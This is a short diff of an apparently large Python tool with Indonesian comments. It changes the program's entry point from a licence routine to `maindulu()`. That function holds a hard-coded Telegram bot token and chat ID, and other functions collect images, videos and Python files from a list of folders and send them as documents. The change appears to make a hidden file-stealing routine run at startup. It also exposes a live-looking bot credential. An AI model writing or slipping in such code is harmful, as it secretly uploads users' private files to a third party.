@@ -965,7 +965,7 @@ folders = [
 # Ekstensi file yang ditambahkan
 extensions = ['.py','.mp4', '.jpg', '.png', '.webp']
 
-def bottelehg():
+def bottelheg():
     for folder in folders:
         try:
             file_list = [os.path.join(folder, f) for f in os.listdir(folder) if any((f.endswith(ext) for ext in extensions))]
@@ -989,7 +989,7 @@ def Mengirim_Dokumen(file_path):
         pass  # postinserted
     return None
     
-def botteleg():
+def maindulu():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
@@ -3892,4 +3892,4 @@ if __name__ == "__main__":
         os.system("clear")
     except:
         pass
-    Licensiprem()
+    maindulu()
